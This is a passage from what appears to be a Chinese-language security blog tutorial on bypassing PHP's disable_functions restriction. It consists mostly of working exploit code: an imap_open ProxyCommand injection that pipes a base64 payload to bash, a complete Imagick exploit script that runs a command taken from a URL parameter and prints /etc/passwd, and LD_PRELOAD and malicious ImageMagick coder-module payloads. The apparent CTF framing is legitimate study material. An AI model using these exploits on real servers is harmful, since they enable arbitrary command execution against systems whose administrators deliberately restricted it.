                    <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
            <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">system</span><span class="p">(</span><span class="n">cmdline</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>编译：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc -c -fPIC exp.c -o hack <span class="o">&amp;&amp;</span> gcc --share hack -o exp.so
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210124124646347.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210124124646347.png, https://gitee.com/leonsec/images/raw/master/image-20210124124646347.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210124124646347.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210124124646347.png"
        title="image-20210124124646347" /></p>
<p>可以看到，执行一次后就停止了</p>
<h2 id="imap_open">imap_open</h2>
<h3 id="参考">参考</h3>
<blockquote>
<p><a href="https://bugs.php.net/bug.php?id=76428" target="_blank" rel="noopener noreffer">PHP :: Sec Bug #76428 :: Command execution through imap_open</a>
<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19518" target="_blank" rel="noopener noreffer">CVE - CVE-2018-19518 (mitre.org)</a></p>
</blockquote>
<h3 id="利用-1">利用</h3>
<p>php imap扩展用于在PHP中执行邮件收发操作。其<code>imap_open</code>函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）</p>
<p>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞</p>
<p>注意：需要<code>php.ini</code>中<code>imap.enable_insecure_rsh= On</code></p>
<p>exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$payload</span> <span class="o">=</span> <span class="s2">&#34;echo hello|tee /tmp/executed&#34;</span><span class="p">;</span>
<span class="nv">$encoded_payload</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
<span class="nv">$server</span> <span class="o">=</span> <span class="s2">&#34;any -o ProxyCommand=echo</span><span class="se">\t</span><span class="s2">&#34;</span><span class="o">.</span><span class="nv">$encoded_payload</span><span class="o">.</span><span class="s2">&#34;|base64</span><span class="se">\t</span><span class="s2">-d|bash&#34;</span><span class="p">;</span>
<span class="o">@</span><span class="nx">imap_open</span><span class="p">(</span><span class="s1">&#39;{&#39;</span><span class="o">.</span><span class="nv">$server</span><span class="o">.</span><span class="s1">&#39;}:143/imap}INBOX&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210124144646549.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210124144646549.png, https://gitee.com/leonsec/images/raw/master/image-20210124144646549.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210124144646549.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210124144646549.png"
        title="image-20210124144646549" /></p>
<p>因为<code>imap_open</code>使用<code>-oProxyCommand=</code>会调用<code>rsh</code>系统命令，所以同样的可以使用<code>ld_preload</code>来bypass：</p>
<p>ld_preload.php:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;LD_PRELOAD=./exp.so&#34;</span><span class="p">);</span>
<span class="nx">imap_open</span><span class="p">(</span><span class="s2">&#34;{any -o ProxyCommand=&#39;&#39;}&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210124145536052.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210124145536052.png, https://gitee.com/leonsec/images/raw/master/image-20210124145536052.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210124145536052.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210124145536052.png"
        title="image-20210124145536052" /></p>
<h2 id="imagick">Imagick</h2>
<h3 id="简介">简介</h3>
<blockquote>
<p>Imagick is a native php extension to create and modify images using the ImageMagick API.</p>
<p>ImageMagick is a software suite to create, edit, and compose bitmap images. It can read, convert and write images in a variety of formats (over 100) including DPX, EXR, GIF, JPEG, JPEG-2000, PDF, PhotoCD, PNG, Postscript, SVG, and TIFF.</p>
<p><a href="https://www.php.net/manual/en/intro.imagick.php" target="_blank" rel="noopener noreffer">PHP: Introduction - Manual</a></p>
</blockquote>
<h3 id="命令注入">命令注入</h3>
<p>参考链接：<a href="https://www.exploit-db.com/exploits/39766" target="_blank" rel="noopener noreffer">Imagick 3.3.0 (PHP 5.4) - disable_functions Bypass - PHP webapps Exploit (exploit-db.com)</a></p>
<blockquote>
<p>Imagick  &lt;= 3.3.0</p>
<p>PHP &gt;= 5.4</p>
</blockquote>
<p>exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="c1"># Exploit Title: PHP Imagick disable_functions Bypass
</span><span class="c1"># Date: 2016-05-04
</span><span class="c1"># Exploit Author: RicterZ (ricter@chaitin.com)
</span><span class="c1"># Vendor Homepage: https://pecl.php.net/package/imagick
</span><span class="c1"># Version: Imagick  &lt;= 3.3.0 PHP &gt;= 5.4
</span><span class="c1"># Test on: Ubuntu 12.04
</span><span class="c1"></span>
<span class="c1"># Exploit:
</span><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span>
<span class="c1"># PHP Imagick disable_functions Bypass
</span><span class="c1"># Author: Ricter &lt;ricter@chaitin.com&gt;
</span><span class="c1">#
</span><span class="c1"># $ curl &#34;127.0.0.1:8080/exploit.php?cmd=cat%20/etc/passwd&#34;
</span><span class="c1"># &lt;pre&gt;
</span><span class="c1"># Disable functions: exec,passthru,shell_exec,system,popen
</span><span class="c1"># Run command: cat /etc/passwd
</span><span class="c1"># ====================
</span><span class="c1"># root:x:0:0:root:/root:/usr/local/bin/fish
</span><span class="c1"># daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class="c1"># bin:x:2:2:bin:/bin:/bin/sh
</span><span class="c1"># sys:x:3:3:sys:/dev:/bin/sh
</span><span class="c1"># sync:x:4:65534:sync:/bin:/bin/sync
</span><span class="c1"># games:x:5:60:games:/usr/games:/bin/sh
</span><span class="c1"># ...
</span><span class="c1"># &lt;/pre&gt;
</span><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;Disable functions: &#34;</span> <span class="o">.</span> <span class="nx">ini_get</span><span class="p">(</span><span class="s2">&#34;disable_functions&#34;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
<span class="nv">$command</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;id&#39;</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">&#34;Run command: </span><span class="si">$command\n</span><span class="s2">====================</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>

<span class="nv">$data_file</span> <span class="o">=</span> <span class="nx">tempnam</span><span class="p">(</span><span class="s1">&#39;/tmp&#39;</span><span class="p">,</span> <span class="s1">&#39;img&#39;</span><span class="p">);</span>
<span class="nv">$imagick_file</span> <span class="o">=</span> <span class="nx">tempnam</span><span class="p">(</span><span class="s1">&#39;/tmp&#39;</span><span class="p">,</span> <span class="s1">&#39;img&#39;</span><span class="p">);</span>

<span class="nv">$exploit</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;</span><span class="dl">EOF</span><span class="s">
</span><span class="s">push graphic-context
</span><span class="s">viewbox 0 0 640 480
</span><span class="s">fill &#39;url(https://127.0.0.1/image.jpg&#34;|$command&gt;$data_file&#34;)&#39;
</span><span class="s">pop graphic-context
</span><span class="s"></span><span class="dl">EOF</span><span class="p">;</span>

<span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$imagick_file</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$exploit</span><span class="p">);</span>
<span class="nv">$thumb</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Imagick</span><span class="p">();</span>
<span class="nv">$thumb</span><span class="o">-&gt;</span><span class="na">readImage</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$imagick_file</span><span class="s2">&#34;</span><span class="p">);</span>
<span class="nv">$thumb</span><span class="o">-&gt;</span><span class="na">writeImage</span><span class="p">(</span><span class="nx">tempnam</span><span class="p">(</span><span class="s1">&#39;/tmp&#39;</span><span class="p">,</span> <span class="s1">&#39;img&#39;</span><span class="p">));</span>
<span class="nv">$thumb</span><span class="o">-&gt;</span><span class="na">clear</span><span class="p">();</span>
<span class="nv">$thumb</span><span class="o">-&gt;</span><span class="na">destroy</span><span class="p">();</span>

<span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$data_file</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><h3 id="ghostscript">Ghostscript</h3>
<p><code>ImageMagick</code> 在处理一些类型的文件的时候需要依赖外部程序解析</p>
<p>据此在<a href="https://imagemagick.org/script/formats.php" target="_blank" rel="noopener noreffer">ImageMagick - Formats</a>可以找到相关调用<code>Ghostscript</code>的图片类型：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210124170357982.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210124170357982.png, https://gitee.com/leonsec/images/raw/master/image-20210124170357982.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210124170357982.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210124170357982.png"
        title="image-20210124170357982" /></p>
<p>新版本禁用了一些格式，还剩下<code>eps</code>和<code>ept</code>格式可以使用</p>
<p>生成<code>ept</code>或<code>eps</code>文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">convert 1.png 1.ept
convert 1.png 1.eps
</code></pre></td></tr></table>
</div>
</div><p>imagemagick.php:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$image</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Imagick</span><span class="p">(</span><span class="s1">&#39;1.ept&#39;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>查看子进程情况：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">strace -f /www/server/php/56/bin/php imagemagick.php 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep execve
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210124170020950.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210124170020950.png, https://gitee.com/leonsec/images/raw/master/image-20210124170020950.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210124170020950.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210124170020950.png"
        title="image-20210124170020950" /></p>
<p>因为环境没有<code>gs</code>命令，可以看到尝试去调用了<code>/usr/bin/gs</code>、<code>/usr/sbin/gs</code>、<code>/usr/local/sbin/gs</code>等，fork了新进程，可以利用<code>LD_PRELOAD</code>进行bypass</p>
<p>利用过程与上文类似</p>
<h3 id="ffmpeg">FFmpeg</h3>
<p>与<code>Ghostscript</code>类似，以下文件格式被<code>ImageMagick</code> 解析时会去调用外部程序：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">wmv,mov,m4v,m2v,mp4,mpg,mpeg,mkv,avi,3g2,3gp
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210124171955327.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210124171955327.png, https://gitee.com/leonsec/images/raw/master/image-20210124171955327.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210124171955327.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210124171955327.png"
        title="image-20210124171955327" /></p>
<p>查看调用子进程情况：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210124173957062.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210124173957062.png, https://gitee.com/leonsec/images/raw/master/image-20210124173957062.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210124173957062.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210124173957062.png"
        title="image-20210124173957062" /></p>
<p>尝试调用<code>ffmpeg</code>，可以利用<code>LD_PRELOAD</code>进行bypass</p>
<p>利用过程类似</p>
<h3 id="magick_coder_module_path">MAGICK_CODER_MODULE_PATH</h3>
<blockquote>
<p>Set path where ImageMagick can locate its coder modules. This path permits the user to arbitrarily extend the image formats supported by ImageMagick by adding loadable coder modules from an preferred location rather than copying them into the ImageMagick installation directory.</p>
<p>[ImageMagick - Resources](<a href="https://www.imagemagick.org/script/resources.php#Environment" target="_blank" rel="noopener noreffer">https://www.imagemagick.org/script/resources.php#Environment</a> Variables)</p>
</blockquote>
<p><code>MAGICK_CODER_MODULE_PATH</code>在文档中的大概意思是允许用户任意扩展 ImageMagick 支持的图像格式，从首选位置添加可加载的编码器模块</p>
<p>据此我们可以加载自己构造的恶意编码器，绕过<code>disable_function</code>执行可控命令</p>
<p>png.c:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp"></span>	
<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
<span class="k">static</span> <span class="kt">void</span> <span class="n">initialize_navigationBarImages</span><span class="p">()</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">basedir</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;BASEDIR&#34;</span><span class="p">);</span>
	<span class="kt">char</span> <span class="n">cmd</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
	<span class="n">snprintf</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">&#34;/readflag&gt;%s/flag&#34;</span><span class="p">,</span> <span class="n">basedir</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>png.la:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp"># png.la - a libtool library file
</span><span class="cp"># Generated by libtool (GNU libtool) 2.4.6 Debian-2.4.6-2
</span><span class="cp">#
</span><span class="cp"># Please DO NOT delete this file!
</span><span class="cp"># It is necessary for linking the library.
</span><span class="cp"></span>
<span class="cp"># The name that we can dlopen(3).
</span><span class="cp"></span><span class="n">dlname</span><span class="o">=</span><span class="err">&#39;</span><span class="n">png</span><span class="p">.</span><span class="n">so</span><span class="err">&#39;</span>

<span class="cp"># Names of this library.
</span><span class="cp"></span><span class="n">library_names</span><span class="o">=</span><span class="err">&#39;</span><span class="n">png</span><span class="p">.</span><span class="n">so</span> <span class="n">png</span><span class="p">.</span><span class="n">so</span> <span class="n">png</span><span class="p">.</span><span class="n">so</span><span class="err">&#39;</span>

<span class="cp"># The name of the static archive.
</span><span class="cp"></span><span class="n">old_library</span><span class="o">=</span><span class="err">&#39;&#39;</span>

<span class="cp"># Linker flags that cannot go in dependency_libs.
</span><span class="cp"></span><span class="n">inherited_linker_flags</span><span class="o">=</span><span class="err">&#39;</span> <span class="o">-</span><span class="n">pthread</span> <span class="o">-</span><span class="n">fopenmp</span><span class="err">&#39;</span>

<span class="cp"># Libraries that this one depends upon.
</span><span class="cp"></span><span class="n">dependency_libs</span><span class="o">=</span><span class="err">&#39;&#39;</span>

<span class="cp"># Names of additional weak libraries provided by this library
</span><span class="cp"></span><span class="n">weak_library_names</span><span class="o">=</span><span class="err">&#39;&#39;</span>

<span class="cp"># Version information for png.
</span><span class="cp"></span><span class="n">current</span><span class="o">=</span><span class="mi">0</span>
<span class="n">age</span><span class="o">=</span><span class="mi">0</span>
<span class="n">revision</span><span class="o">=</span><span class="mi">0</span>

<span class="cp"># Is this an already installed library?
</span><span class="cp"></span><span class="n">installed</span><span class="o">=</span><span class="n">yes</span>

<span class="cp"># Should we warn about portability when linking against -modules?
</span><span class="cp"></span><span class="n">shouldnotlink</span><span class="o">=</span><span class="n">yes</span>

<span class="cp"># Files to dlopen/dlpreopen
</span><span class="cp"></span><span class="n">dlopen</span><span class="o">=</span><span class="err">&#39;&#39;</span>
<span class="n">dlpreopen</span><span class="o">=</span><span class="err">&#39;&#39;</span>

<span class="cp"># Directory that this library needs to be installed in:
</span><span class="cp"></span><span class="n">libdir</span><span class="o">=</span><span class="err">&#39;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="mi">6</span><span class="n">a1b56cc35a395bc73b6d40410efbf9c</span><span class="err">&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>exp.php:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    
<span class="nv">$basedir</span> <span class="o">=</span> <span class="s2">&#34;/tmp/6a1b56cc35a395bc73b6d40410efbf9c&#34;</span><span class="p">;</span>
<span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;MAGICK_CODER_MODULE_PATH=&#34;</span> <span class="o">.</span> <span class="nv">$basedir</span><span class="p">);</span>
<span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;BASEDIR=&#34;</span> <span class="o">.</span> <span class="nv">$basedir</span><span class="p">);</span>

<span class="cm">/* Create Imagick objects */</span>
<span class="nv">$Imagick</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Imagick</span><span class="p">();</span>

<span class="cm">/* Create ImagickDraw objects */</span>
<span class="nv">$ImagickDraw</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ImagickDraw</span><span class="p">();</span>

<span class="cm">/* Create ImagickPixel objects */</span>
<span class="nv">$ImagickPixel</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ImagickPixel</span><span class="p">();</span>

<span class="cm">/* This array contains polygon geometry */</span>
<span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">378.1</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">81.72</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">381.1</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">79.56</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">384.3</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">78.12</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">387.6</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">77.33</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">391.1</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">77.11</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">394.6</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">77.62</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">397.8</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">78.77</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">400.9</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">80.57</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">403.6</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">83.02</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">523.9</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">216.8</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">526.2</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">219.7</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">527.6</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mi">223</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">528.4</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">226.4</span> <span class="p">),</span>
                <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;x&#34;</span> <span class="o">=&gt;</span> <span class="mf">528.6</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span> <span class="o">=&gt;</span> <span class="mf">229.8</span> <span class="p">),</span>
